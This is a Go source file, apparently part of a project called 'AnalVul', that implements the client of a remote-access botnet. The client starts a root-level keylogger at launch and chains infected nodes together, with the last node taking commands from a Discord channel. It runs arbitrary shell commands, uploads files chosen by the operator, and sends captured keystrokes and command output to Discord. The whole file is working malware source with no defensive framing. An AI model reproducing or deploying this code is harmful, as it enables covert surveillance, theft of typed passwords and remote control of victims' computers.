package client

import (
	"AnalVul/Concurent"
	"AnalVul/Constantes"
	"AnalVul/packages"
	"fmt"
	"github.com/MarinX/keylogger"
	"github.com/bwmarrin/discordgo"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

type Client struct {
	id                  int64
	connBeacon          net.Conn
	addrBeacon          string
	wg                  sync.WaitGroup
	addr                string
	commandsToForward   []*messages.Commands
	myCommands          []*messages.Commands
	myCommandsSemaphore *Concurent.Semaphore
	forwardSemaphore    *Concurent.Semaphore
	keysPressed         string
	keyloggerSema       *Concurent.Semaphore
	index               int
	firstLoad           bool
	discordBot          *discordgo.Session
	knownNodes          []*messages.Node
	nodeSema            *Concurent.Semaphore
	msgSemaphore        *Concurent.Semaphore
}

func (this *Client) GetId() int64 {
	return this.id
}

func RandomInt64() int64 {
	rand.Seed(time.Now().UnixNano())
	high := int64(rand.Int31())
	low := int64(rand.Int31())
	return (high << 32) | low
}

func NewClientWithoutId(addr string, beaConnAddr string, wg sync.WaitGroup) Client {
	return NewClient(RandomInt64(), addr, beaConnAddr, wg)
}

func NewClient(id int64, addr string, beaConnAddr string, wg sync.WaitGroup) Client {
	client := Client{
		id:                  id,
		connBeacon:          nil,
		addrBeacon:          beaConnAddr,
		wg:                  wg,
		addr:                addr,
		commandsToForward:   make([]*messages.Commands, 0),
		myCommands:          make([]*messages.Commands, 0),
		myCommandsSemaphore: Concurent.NewSemaphore(1),
		forwardSemaphore:    Concurent.NewSemaphore(1),
		keysPressed:         "",
		keyloggerSema:       Concurent.NewSemaphore(1),
		index:               0,
		firstLoad:           true,
		discordBot:          nil,
		knownNodes:          make([]*messages.Node, 0),
		nodeSema:            Concurent.NewSemaphore(1),
		msgSemaphore:        Concurent.NewSemaphore(1),
	}
	client.getTcpConnection()
	go client.ClientTcpWorker()
	go client.heartbeat(1, 2)
	go client.commandsWorker()
	go client.StartKeylogger()
	go client.connectDiscord()
	return client
}

func (this *Client) ClientTcpWorker() {
	listener, err := net.Listen("tcp", this.addr)
	if err != nil {
		log.Fatalf("Erreur lors de l'essaie d'écoute tcp: %s\n", err.Error())
		return
	}
	if Constantes.RECEIVE_LOG {
		log.Printf("Ecoute TCP sur %s", listener.Addr())
	}
	conn, err := listener.Accept()
	for {
		if err != nil {
			log.Println("Il y a eu un probleme lors de l'acceptation de la connexion: " + err.Error())
			continue
		}
		msg, err := messages.ReceiveProtoMessageMessage(conn)
		if err != nil {
			log.Println("Problem while receiving message: " + err.Error())
			continue
		}
		if msg == nil {
			continue
		}
		go this.handleProtoMessage(conn, msg)
	}
}

func (this *Client) SendMessageToBeacon(msg *messages.ProtoMessage) {
	this.sendMessage(this.connBeacon, msg, false, this.handleProtoMessage)
}

func (this *Client) SendMessageToBeaconWithResponse(msg *messages.ProtoMessage) {
	this.sendMessage(this.connBeacon, msg, true, this.handleProtoMessage)
}

func (this *Client) AnswerMessage(conn net.Conn, msg *messages.ProtoMessage) {
	this.sendMessage(conn, msg, false, this.handleProtoMessage)
}

func (this *Client) sendMessage(conn net.Conn, msg *messages.ProtoMessage, exceptResponse bool, handler func(c net.Conn, msg *messages.ProtoMessage)) *messages.ProtoMessage {
	if conn == nil {
		return nil
	}
	this.msgSemaphore.Acquire()
	err := messages.SendProtoMessage(conn, msg)
	if err != nil {
		log.Println("Erreur au cours de l'envoie du message %s", err)
	}
	if exceptResponse {
		myMsg, err := messages.ReceiveProtoMessageMessage(conn)
		if err != nil {
			fmt.Println("Erreur lors de la reception du message %s", err)
		}
		if handler != nil {
			go handler(conn, myMsg)
		}
		this.msgSemaphore.Release()
		return myMsg
	}
	this.msgSemaphore.Release()

	return nil
}

func (this *Client) getTcpConnection() {
	if this.connBeacon == nil {
		this.connBeacon, _ = net.Dial("tcp", this.addrBeacon)
	}
}

func (this *Client) isFinalNode() bool {
	return this.connBeacon == nil
}

func (this *Client) stopClient() {
	this.wg.Done()
}

func GenerateRandomNumber(min, max int) int {
	rand.Seed(time.Now().UnixNano())  // Initialisation du générateur de nombres aléatoires
	return rand.Intn(max-min+1) + min // Génère un nombre entre min et max inclus
}

func (this *Client) heartbeat(min int, max int) {
	sleepTime := GenerateRandomNumber(min, max)

	for {
		time.Sleep(time.Duration(sleepTime) * time.Second)
		this.getTcpConnection()
		if this.isFinalNode() {
			this.getCommandsFromDiscord()
			this.uploadKnownNodesToDiscord()
		} else {
			nodes := make([]*messages.Node, 0)
			this.nodeSema.Acquire()
			for _, node := range this.knownNodes {
				nodes = append(nodes, node)
			}
			nodes = append(nodes, &messages.Node{
				Id:   this.id,
				Host: this.addr,
			})
			this.knownNodes = make([]*messages.Node, 0)
			this.nodeSema.Release()
			msg := &messages.ProtoMessage{
				FetchMessage: &messages.ProtoMessage_FetchCommandsRequest{
					FetchCommandsRequest: &messages.FetchCommandsRequest{
						Nodes: nodes,
					},
				},
			}
			go this.SendMessageToBeaconWithResponse(msg)
		}
		sleepTime = GenerateRandomNumber(min, max)
	}
}

func (this *Client) commandsWorker() {
	for {
		this.myCommandsSemaphore.Acquire()
		if len(this.myCommands) > 0 {
			myCmd := this.myCommands[0]
			this.myCommands = this.myCommands[1:]
			go this.executeCommand(myCmd)
		}
		this.myCommandsSemaphore.Release()
	}
}

func (this *Client) handleProtoMessage(conn net.Conn, myMsg *messages.ProtoMessage) {
	msg := this.handleMessage(myMsg, conn)
	if msg == nil {
		return
	}
	this.AnswerMessage(conn, msg)
}

func (this *Client) fetchCommandsRequestHandler(fetchReq *messages.FetchCommandsRequest) *messages.ProtoMessage {

	this.nodeSema.Acquire()
	for _, node := range fetchReq.Nodes {
		this.knownNodes = append(this.knownNodes, node)
	}
	this.nodeSema.Release()

	this.forwardSemaphore.Acquire()
	commands := make([]*messages.Commands, 0)
	for _, cmd := range this.commandsToForward {
		commands = append(commands, cmd)
	}
	msg := &messages.ProtoMessage{
		FetchMessage: &messages.ProtoMessage_FetchCommandsResponse{
			FetchCommandsResponse: &messages.FetchCommandsResponse{
				Commands: commands,
			},
		},
	}
	this.commandsToForward = make([]*messages.Commands, 0)
	this.forwardSemaphore.Release()
	return msg

}

func (this *Client) fetchCommandsResponseHandler(res *messages.FetchCommandsResponse) *messages.ProtoMessage {
	for _, command := range res.GetCommands() {
		if command.GetTarget() == this.GetId() {
			this.myCommandsSemaphore.Acquire()
			this.myCommands = append(this.myCommands, command)
			this.myCommandsSemaphore.Release()
		} else {
			this.forwardSemaphore.Acquire()
			this.commandsToForward = append(this.commandsToForward, command)
			this.forwardSemaphore.Release()
		}
	}
	return nil
}

func (this *Client) handleMessage(msg *messages.ProtoMessage, conn net.Conn) *messages.ProtoMessage {
	switch msg.GetFetchMessage().(type) {
	case *messages.ProtoMessage_FetchCommandsRequest:
		return this.fetchCommandsRequestHandler(msg.GetFetchCommandsRequest())
	case *messages.ProtoMessage_FetchCommandsResponse:
		return this.fetchCommandsResponseHandler(msg.GetFetchCommandsResponse())
	case *messages.ProtoMessage_FileTransferRequest:
		ftr := msg.GetFileTransferRequest()
		go this.PrepareForFileTransfer(ftr.Name, int(ftr.Size), conn, ftr.Uuid)
		return nil
	default:
		if this.isFinalNode() {
			// Si on est une node finale alors on va essayer de faire l'upload sur le net
			go this.uploadMessageData(msg)
			return nil
		}
		// si on est pas une node finale, le but est de forward le packet vers notre beacon
		go this.SendMessageToBeacon(msg)
		return nil
	}
}

func (this *Client) sendOrHandle(msg *messages.ProtoMessage) {
	if msg != nil {
		if this.isFinalNode() {
			this.uploadMessageData(msg)
		} else {
			this.handleMessage(msg, nil)
		}
	}
}

func (this *Client) executeCommand(command *messages.Commands) {

	args := strings.Split(command.Command, " ")

	if len(args) == 0 {
		return
	}

	if args[0] == "screenshot" {
		msg := this.takeScreenShot(command.Uuid)
		go this.sendOrHandle(msg)
		return
	}

	if args[0] == "uploadfile" && len(args) >= 2 {
		msg := this.uploadFile(args[1], command.Uuid)
		go this.sendOrHandle(msg)
		return
	}

	if args[0] == "uploadkeylogger" {
		this.keyloggerSema.Acquire()
		content := strings.Clone(this.keysPressed)
		this.keysPressed = ""
		this.keyloggerSema.Release()
		msg := this.uploadKeyLogger(content, command.Uuid)
		go this.sendOrHandle(msg)
		return
	}

	msg := this.executeStringCommand(command.Command, command.Uuid)
	go this.sendOrHandle(msg)
	return
}

func (this *Client) StartKeylogger() {
	// Initialisation du keylogger
	keyboard := keylogger.FindKeyboardDevice()
	logger, err := keylogger.New(keyboard)
	if err != nil {
		fmt.Println("Impossible de démarrer le keylogger ! (Le script necessite d'être root)")
		return
	}
	events := logger.Read()
	for e := range events {
		switch e.Type {
		case keylogger.EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				this.keyloggerSema.Acquire()
				this.keysPressed += e.KeyString() + "/"
				this.keyloggerSema.Release()
			}

			break
		}
	}
}

func (this *Client) getCommandsFromDiscord() {
	commands := this.fetchMessages()
	if !this.firstLoad {
		for _, cmd := range commands {
			args := strings.Split(cmd, " ")
			if len(args) >= 3 {
				id_ := args[0]
				id, err := strconv.ParseInt(id_, 10, 64) // Base 10, 64 bits
				if err != nil {
					continue
				}
				uuid := args[1]
				command_ := ""
				for i, arg := range args {
					if i > 1 {
						command_ += strings.ReplaceAll(arg, "\r", "")
						if i < len(args)-1 {
							command_ += " "
						}
					}
				}
				cmd := &messages.Commands{
					Target:  id,
					Command: command_,
					Uuid:    uuid,
				}
				if this.id == cmd.Target {
					this.myCommandsSemaphore.Acquire()
					this.myCommands = append(this.myCommands, cmd)
					this.myCommandsSemaphore.Release()
				} else {
					this.forwardSemaphore.Acquire()
					this.commandsToForward = append(this.commandsToForward, cmd)
					this.forwardSemaphore.Release()
				}
			}
		}
	} else {
		this.firstLoad = false
	}
}

func (this *Client) uploadKeyLogger(contentKeyLogger string, uuid string) *messages.ProtoMessage {
	return &messages.ProtoMessage{
		FetchMessage: &messages.ProtoMessage_UploadKeylogger{
			UploadKeylogger: &messages.UploadKeyLogger{
				Uuid: uuid,
				Keys: contentKeyLogger,
			},
		},
	}
}

func (this *Client) takeScreenShot(uuid string) *messages.ProtoMessage {
	return nil
}

func (this *Client) uploadFile(filePath string, uuid string) *messages.ProtoMessage {
	// Lis le fichier et récupère son contenu en bytes
	content, err := ioutil.ReadFile(filePath)
	if err != nil {
		return &messages.ProtoMessage{
			FetchMessage: &messages.ProtoMessage_UploadCommandResult{
				UploadCommandResult: &messages.UploadCommandResult{
					Uuid:   uuid,
					Result: "Impossible d'ouvrir et d'upload le fichier ! Le fichier " + filePath + " n'a pas été trouvé !",
				},
			},
		}
	}

	go this.UploadFileContent(filePath, content, uuid)

	return nil
}

func WriteBytesToFile(filename string, data []byte) error {
	err := ioutil.WriteFile(filename, data, 777)
	if err != nil {
		return fmt.Errorf("erreur lors de l'écriture dans le fichier %s : %w", filename, err)
	}
	return nil
}

func (this *Client) UploadFileContent(name string, content []byte, uuid string) {
	if this.isFinalNode() {
		this.UploadFileToWEB(name, content, uuid)
	} else {
		splitted := strings.Split(name, "/")
		name = splitted[len(splitted)-1]
		request := &messages.ProtoMessage{
			FetchMessage: &messages.ProtoMessage_FileTransferRequest{
				FileTransferRequest: &messages.FileTransferRequest{
					Name: "./recompiled_files/" + name,
					Size: int64(len(content)),
					Uuid: uuid,
				},
			},
		}
		response := this.sendMessage(this.connBeacon, request, true, nil)
		if response == nil {
			return
		}
		switch response.GetFetchMessage().(type) {
		case *messages.ProtoMessage_FileTransferResponse:
			res := response.GetFileTransferResponse()
			addr := res.Addr
			this.SendFileToListener(addr, content)
		}
	}
}

func (this *Client) executeStringCommand(myCmd string, uuid string) *messages.ProtoMessage {
	parts := strings.Fields(myCmd)
	if len(parts) == 0 {
		return &messages.ProtoMessage{
			FetchMessage: &messages.ProtoMessage_UploadCommandResult{
				UploadCommandResult: &messages.UploadCommandResult{
					Uuid:   uuid,
					Result: "Erreur dans le formatage de la commande !",
				},
			},
		}
	}

	cmd := exec.Command(parts[0], parts[1:]...)
	output_, err := cmd.Output()
	if err != nil {
		return &messages.ProtoMessage{
			FetchMessage: &messages.ProtoMessage_UploadCommandResult{
				UploadCommandResult: &messages.UploadCommandResult{
					Uuid:   uuid,
					Result: err.Error(),
				},
			},
		}
	}
	output := string(output_)

	return &messages.ProtoMessage{
		FetchMessage: &messages.ProtoMessage_UploadCommandResult{
			UploadCommandResult: &messages.UploadCommandResult{
				Uuid:   uuid,
				Result: output,
			},
		},
	}
}

// Ici au lieu de forward le packet au beacon, nous sommes le beacon donc on va upload directement la donnée sur
// pastebin afin qu'elle soit trouvable par le server.
func (this *Client) uploadMessageData(msg *messages.ProtoMessage) {
	switch msg.GetFetchMessage().(type) {
	// Regarder la fonction handleMessage pour voir comment générer les cas pour chaque type de message
	case *messages.ProtoMessage_UploadCommandResult:
		cmdResult := msg.GetUploadCommandResult()
		go this.UploadCommandResultToDiscord(cmdResult.Uuid, cmdResult.Result)
	case *messages.ProtoMessage_UploadKeylogger:
		keylogger := msg.GetUploadKeylogger()
		go this.UploadKeyLoggerToDiscord(keylogger.Keys)
	default:
		return
	}
}
